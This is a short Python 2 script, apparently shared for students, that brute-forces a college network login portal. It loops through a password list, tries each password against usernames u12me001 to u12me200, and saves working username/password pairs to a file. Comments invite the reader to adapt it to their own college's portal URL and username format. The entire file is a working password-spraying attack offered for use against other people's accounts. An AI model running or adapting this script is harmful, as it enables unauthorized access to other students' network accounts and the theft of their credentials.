import urllib
import os
import sys

usernumber = 1
i = 0
passwd='abcd'

user_list = open("userlist.txt","a")
pass_list = open("passwordlist.txt","r")

flag = True

#Replace the URL in 'get =' to the URL used in your college!
#Replace the user name(u12me00) with the format used in your college!
#You can edit the file passwordlist.txt to add you own custom passwords!

while flag :

	pass_file_read = pass_list.readline()
	if pass_file_read == '':
		flag = False
		print 'End of File'
		sys.exit()
	
	passwd = pass_file_read[:-1]
	print 'Password: ',passwd
	
	while usernumber <= 200 :
		if usernumber <= 9:
			get = urllib.urlopen("http://172.50.1.1:8090/login.xml","mode=191&username="+"u12me00"+str(usernumber)+"&password="+passwd+"&a=1355344698415")
		elif usernumber >= 10 and usernumber <= 99 :
			get = urllib.urlopen("http://172.50.1.1:8090/login.xml","mode=191&username="+"u12me0"+str(usernumber)+"&password="+passwd+"&a=1355344698415")
		else :
			get = urllib.urlopen("http://172.50.1.1:8090/login.xml","mode=191&username="+"u12me"+str(usernumber)+"&password="+passwd+"&a=1355344698415")
		
		code = get.readlines(5)
		str1 = code[0]
		return_value = str1.find("in")
		if return_value != -1:
			print '--->Username: ',usernumber
			user_list.write('Username: '+str(usernumber)+' Password:'+passwd)
			user_list.write("\n")
		usernumber = usernumber  + 1
	os.system("sleep 5")
	usernumber = 1
pass_list.close()
